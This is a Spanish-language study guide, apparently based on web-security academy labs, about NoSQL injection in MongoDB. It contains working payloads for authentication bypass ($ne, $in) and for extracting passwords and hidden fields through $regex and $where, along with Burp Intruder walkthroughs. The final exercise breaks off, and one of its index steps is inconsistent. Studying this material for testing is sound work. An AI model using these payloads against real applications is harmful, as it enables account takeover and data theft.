
Existen dos tipos diferentes de inyección NoSQL:

- Inyección de sintaxis - Esto ocurre cuando puedes romper la sintaxis de la consulta NoSQL, permitiéndote inyectar la tuya propia carga útil. La metodología es similar a la utilizada en la inyección SQL. Sin embargo, la naturaleza del ataque varía de forma significativa, ya que las bases de datos NoSQL utilizan una variedad de lenguajes de consulta, tipos de sintaxis de consulta y diferentes estructuras de datos.
- Inyección de operador - Esto ocurre cuando puedes usar operadores de consulta NoSQL para manipular consultas.

En este tema, veremos cómo probar vulnerabilidades NoSQL en general y luego nos centraremos en explotar vulnerabilidades en MongoDB, que es la base de datos NoSQL más popular. También hemos proporcionado algunos laboratorios para que puedas practicar lo que has aprendido.

Puedes detectar vulnerabilidades en la inyección de NoSQL intentando romper la sintaxis de la consulta. Para ello, prueba sistemáticamente cada entrada enviando cadenas fuzz y caracteres especiales que desencadenen un error de base de datos u otro comportamiento detectable si la aplicación no los sanea o filtra adecuadamente.

--- 

# Detección de inyección NoSQL en MongoDB

Considera una aplicación de compras que muestre productos en diferentes categorías. Cuando el usuario selecciona la categoría **de refrescos**, su navegador solicita la siguiente URL:

`https://insecure-website.com/product/lookup?category=fizzy`

Esto hace que la aplicación envíe una consulta JSON para recuperar productos relevantes de la colección en la base de datos MongoDB: `product`

`this.category == 'fizzy'`

Para comprobar si la entrada `category` puede ser vulnerable, se introduce una cadena fuzz en el valor del parámetro. Un ejemplo de cadena para MongoDB es: 

``'"`{ ;$Foo} $Foo \xYZ``

Utiliza esta cadena fuzz para construir el siguiente ataque:

`https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00`

Si esto provoca un cambio respecto a la respuesta original, puede indicar que la entrada del usuario no está filtrada o sanitizada correctamente.

Las vulnerabilidades de inyección NoSQL pueden ocurrir en diversos contextos, y necesitas adaptar tus cadenas fuzz en consecuencia. De lo contrario, simplemente puedes activar errores de validación que signifiquen que la aplicación nunca ejecute tu consulta.

En este ejemplo, estamos inyectando la cadena fuzz a través de la URL, así que la cadena está codificada por URL. En algunas aplicaciones, puede que necesites inyectar tu carga útil mediante una propiedad JSON en su lugar. En este caso, esta carga útil se convertiría en

``'\"`{\r;$Foo}\n$Foo \\xYZ\u0000``

---

# Determinar que caracteres se procesan

Para determinar qué caracteres interpretan como sintaxis por la aplicación, puedes inyectar caracteres individuales. Por ejemplo, podrías enviar , lo que resulta en la siguiente consulta de MongoDB: `'`

`this.category == '''`

Si esto provoca un cambio respecto a la respuesta original, puede indicar que el carácter ha roto la sintaxis de la consulta y ha causado un error de sintaxis. Puedes confirmarlo enviando una cadena de consulta válida en la entrada, por ejemplo escapando de la cita: `'`

`this.category == '\''`

Si esto no provoca un error de sintaxis, puede significar que la aplicación es vulnerable a un ataque de inyección.

Después de detectar una vulnerabilidad, el siguiente paso es determinar si puedes influir en condiciones booleanas usando la sintaxis NoSQL.

Para comprobar esto, envía dos solicitudes, una con una condición falsa y otra con una condición verdadera. Por ejemplo, podrías usar las sentencias condicionales y lo siguiente: 
`' && 0 && 'x`
`' && 1 && 'x`

`https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x`

`https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x`

Si la aplicación se comporta de forma diferente, esto sugiere que la condición falsa afecta a la lógica de consulta, pero la condición verdadera no. Esto indica que inyectar este tipo de sintaxis afecta a una consulta del lado del servidor.

Ahora que has identificado que puedes influir en condiciones booleanas, puedes intentar anular condiciones existentes para explotar la vulnerabilidad. Por ejemplo, puedes inyectar una condición de JavaScript que siempre evalúe como verdadera, como : `'||'1'=='1`

`https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31`

Esto da lugar a la siguiente consulta de MongoDB:

`this.category == 'fizzy'||'1'=='1'`

Como la condición inyectada es siempre verdadera, la consulta modificada devuelve todos los elementos. Esto te permite ver todos los productos de cualquier categoría, incluidas las ocultas o desconocidas.

También podrías añadir un carácter nulo después del valor de categoría. MongoDB puede ignorar todos los caracteres posteriores a un carácter nulo.

# Inyección de operadores NoSQL

- `$where` - Empareja documentos que satisfacen una expresión JavaScript.
- `$ne` - Coincide con todos los valores que no sean iguales a un valor especificado.
- `$in` - Coincide con todos los valores especificados en un array.
- `$regex` - Selecciona documentos cuyos valores coinciden con una expresión regular especificada.

En los mensajes JSON, puedes insertar operadores de consulta como objetos anidados. Por ejemplo, se convierte en . `{"username":"wiener"}``{"username":{"$ne":"invalid"}}`

Para entradas basadas en URL, puedes insertar operadores de consulta mediante parámetros de URL. Por ejemplo, se convierte en . Si esto no funciona, puedes probar lo siguiente: `username=wiener``username[$ne]=invalid`

1. Convierte el método de petición de `GET` a `POST`
2. Cambia el encabezado `Content-Type` a `application/json`
3. Añade JSON al cuerpo del mensaje.
4. Inyecta operadores de consulta en el JSON.

Consideremos una aplicación vulnerable que acepta un nombre de usuario y una contraseña en el cuerpo de una solicitud: `POST`

`{"username":"wiener","password":"peter"}`

Prueba cada entrada con un rango de operadores. Por ejemplo, para probar si la entrada de nombre de usuario procesa el operador de consulta, podrías probar la siguiente inyección:

`{"username":{"$ne":"invalid"},"password":"peter"}`

Si se aplica el operador, esto consulta a todos los usuarios cuyo nombre de usuario no es igual a . `$ne``invalid`

Si tanto la entrada de nombre de usuario como la contraseña procesan al operador, puede ser posible saltarse la autenticación usando la siguiente carga útil:

`{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`

Esta consulta devuelve todas las credenciales de inicio de sesión donde tanto el nombre de usuario como la contraseña no son iguales a . Como resultado, inicias sesión en la aplicación como el primer usuario de la colección. `invalid`

Para dirigir una cuenta, puedes construir una carga útil que incluya un nombre de usuario conocido o un nombre de usuario que hayas adivinado. Por ejemplo:

`{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`

### 1. Bypass de Autenticación (Operadores de Comparación)

La prueba más común es intentar saltarse un login usando el operador `$ne` (not equal). Si el backend no valida el tipo de dato y acepta JSON, puedes enviar una instrucción que diga: "Loguéame si el usuario es 'admin' y el password **no es igual** a 1".

- **Payload en JSON (para el cuerpo del POST):**
    
    JSON
    
    ```
    {
      "username": "admin",
      "password": {"$ne": "1"}
    }
    ```
    
- **Payload en URL (Query String):** `?username=admin&password[$ne]=1`
    

> Si la página te permite entrar, es vulnerable porque ha aceptado un objeto en lugar de una cadena y ha ejecutado el operador lógico.

### 2. Inyección de Expresiones Regulares (`$regex`)

Esta prueba sirve para extraer información carácter por carácter. Se utiliza para adivinar contraseñas o tokens sin conocerlos.

- **Prueba de existencia:** `{"username": {"$regex": "^a.*"}}` _(Esto busca cualquier usuario que empiece por la letra "a")._
    
- **Extracción de password:** `{"username": "admin", "password": {"$regex": "^pass123.*"}}` Si la respuesta es positiva (ej. "Login correcto"), sabes que la contraseña empieza por esos caracteres.
    

### 3. Inyección de JavaScript (`$where`)

Algunas bases de datos NoSQL permiten ejecutar funciones JavaScript directamente. Se puede probar inyectando código que siempre devuelva "verdadero".

- **Payload típico:** `' || 1==1//` `'; return true; //`

## Exfiltración de datos en MongoDB

Consideremos una aplicación vulnerable que permite a los usuarios buscar otros nombres de usuario registrados y mostrar su rol. Esto activa una petición a la URL:

`https://insecure-website.com/user/lookup?username=admin`

Esto da lugar a la siguiente consulta NoSQL de la colección: `users`

`{"$where":"this.username == 'admin'"}`

Como la consulta utiliza el operador, puedes intentar inyectar funciones JavaScript en esta consulta para que devuelva datos sensibles. Por ejemplo, podrías enviar la siguiente carga útil: `$where`

`admin' && this.password[0] == 'a' || 'a'=='b`

Esto devuelve el primer carácter de la cadena de contraseñas del usuario, permitiéndote extraer la contraseña carácter por carácter.

También podrías usar la función JavaScript para extraer información. Por ejemplo, la siguiente carga útil te permite identificar si la contraseña contiene dígitos: `match()`

`admin' && this.password.match(/\d/) || 'a'=='b`

Como MongoDB gestiona datos semiestructurados que no requieren un esquema fijo, puede que necesites identificar campos válidos en la colección antes de poder extraer datos usando inyección de JavaScript.

Por ejemplo, para identificar si la base de datos de MongoDB contiene un campo, podrías enviar la siguiente carga útil: `password`

`https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'`

Envía la carga útil de nuevo para un campo existente y para uno que no existe. En este ejemplo, sabes que el campo existe, así que podrías enviar las siguientes cargas útiles: `username`

`admin' && this.username!='` `admin' && this.foo!='`

Si el campo existe, esperarías que la respuesta fuera idéntica a la del campo existente (), pero diferente a la respuesta del campo que no existe (). `password``username``foo`

Si quieres probar diferentes nombres de campos, podrías realizar un ataque de diccionario, usando una lista de palabras para alternar entre diferentes nombres potenciales de campos.

# EJERCICIO COMPLETO NoSQL Para extraer datos

1. En el navegador de Burp, accede al laboratorio e inicia sesión en la aplicación usando las credenciales . `wiener:peter`
    
2. En Burp, ve a **Proxy > historial HTTP**. Haz clic derecho en la solicitud y **selecciona Enviar al repetidor**. `GET /user/lookup?user=wiener`
    
3. En Repeater, introduce un carácter en el parámetro de usuario. Fíjate que esto provoca un error. Esto puede indicar que la entrada del usuario no fue filtrada o desinfectada correctamente. `'`
    
4. Envía una carga útil válida de JavaScript en el parámetro. Por ejemplo, podrías usar `user``wiener'+'`
    
    Asegúrate de codificar la payload por URL resaltándola y usando la tecla rápida. Fíjate que recupera los datos de la cuenta del usuario, lo que indica que puede estar ocurriendo una forma de inyección en el servidor. `Ctrl-U``wiener`
    
5. Identifica si puedes inyectar condiciones booleanas para cambiar la respuesta:
    
    1. Presenta una condición falsa en el parámetro. Por ejemplo: `user``wiener' && '1'=='2`
        
        Asegúrate de codificar la payload por URL. Fíjate que recupera el mensaje . `Could not find user`
        
    2. Envía una condición real en el parámetro de usuario. Por ejemplo: `wiener' && '1'=='1`
        
        Asegúrate de codificar la payload por URL. Fíjate que ya no causa errores. En su lugar, recupera los datos de la cuenta para el usuario. Esto demuestra que puedes desencadenar diferentes respuestas tanto en condiciones verdaderas como falsas. `wiener`
        
6. Identifica la longitud de la contraseña:
    
    1. Cambia el parámetro de usuario a , y luego envía la petición. `administrator' && this.password.length < 30 || 'a'=='b`
        
        Asegúrate de codificar la payload por URL. Fíjate en que la respuesta recupera los datos de la cuenta del usuario. Esto indica que la condición es cierta porque la contraseña tiene menos de 30 caracteres. `administrator`
        
    2. Reduce la longitud de la contraseña en la carga útil y luego reenvía la solicitud.
    3. Sigue probando diferentes longitudes.
    4. Observa que cuando envías el valor, recuperas los datos de la cuenta del usuario, pero al enviar el valor, recibes un mensaje de error porque la condición es falsa. Esto indica que la contraseña tiene 8 caracteres.`9``administrator``8`
7. Haz clic derecho en la solicitud y **selecciona Enviar al intruso**.
    
8. En Intruder, enumera la contraseña:
    
    1. Cambia el parámetro de usuario a . Esto incluye dos posiciones de carga útil. Asegúrate de codificar la payload por URL.`administrator' && this.password[§0§]=='§a§`
    2. **Selecciona Ataque con bomba racimo** en el menú desplegable de tipo de ataque.
    3. En el panel **lateral de Cargas Útiles**, selecciona posición en la lista desplegable **de posiciones de Cargas Útiles**. Añade números del 0 al 7 por cada carácter de la contraseña.`1`
    4. Selecciona posición desde la lista desplegable **de posición de la carga** útil y luego añade letras minúsculas de a a a z. Si usas Burp Suite Professional, puedes usar la lista integrada.`2``a-z`
    5. Haz **clic Iniciar ataque**.
    6. Ordena los resultados del ataque por **Carga Útil 1** y luego **por Longitud**. Observa que una solicitud para cada posición de carácter (0 a 7) ha sido evaluada como verdadera y ha recuperado los detalles para el usuario. Fíjate en las letras de la columna **Payload 2** hacia abajo.`administrator`
9. En el navegador de Burp, inicia sesión como usuario usando la contraseña enumerada. El laboratorio está resuelto. `administrator`

# Operadores de Inyección

Consideremos una aplicación vulnerable que acepta nombre de usuario y contraseña en el cuerpo de una solicitud: `POST`

`{"username":"wiener","password":"peter"}`

Para probar si puedes inyectar operadores, podrías intentar añadir el operador como un parámetro adicional, luego enviar una petición donde la condición se evalúe como falsa y otra que evalúe como verdadera. Por ejemplo: `$where`

`{"username":"wiener","password":"peter", "$where":"0"}`

`{"username":"wiener","password":"peter", "$where":"1"}`

Si hay una diferencia entre las respuestas, esto puede indicar que la expresión JavaScript en la cláusula está siendo evaluada. `$where`

Si has inyectado un operador que te permite ejecutar JavaScript, podrías usar el método para extraer el nombre de los campos de datos. Por ejemplo, podrías enviar la siguiente carga útil: `keys()`

`"$where":"Object.keys(this)[0].match('^.{0}a.*')"`

Esto inspecciona el primer campo de datos en el objeto de usuario y devuelve el primer carácter del nombre del campo. Esto te permite extraer el nombre del campo carácter por carácter.

O usando `$regex`

`{"username":"admin","password":{"$regex":"^.*"}}` 

`{"username":"admin","password":{"$regex":"^a*"}}`

# EJERCICIO

Nos piden, a parte de iniciar sesión como "carlos", sacar su token de reseteo de contraseña, dicho campo no lo conocemos así que usaremos $where

Primero debemos determinar cuantos campos tiene el objeto mediante una expresion booleana

```
{
    "username": "carlos",
    "password": {"$ne": "1"},
    "$where": "Object.keys(this).length == 4"
}
```

Si nos responde con **Account Locked** sabemos que es verdad, si no iremos probando, en este caso es el 4, con lo que sería: id, username, password, con lo que por cojones el ultimo que sería \[3\] es el que buscamos

```
{ 
	"username": "carlos", 
	"password": {"$ne": "1"}, 
	"$where": "Object.keys(this)[4].length == 11" 
}
```

- **Si responde "Account locked"**: La longitud es correcta (11 en este ejemplo).
- **Si responde "Invalid username or password"**: Prueba con otros números (8, 9, 10, 12...) hasta que el mensaje cambie a "Account locked".
- Podemos usar el **Intruder,** nos da 4

Ahora usamos el Intruder para el nombre mediante

```
{ 
	"username": "carlos", 
	"password": {"$ne": "1"}, 
	"$where": "Object.keys(this)[3].split('')[0] == 'u'" 
}
```

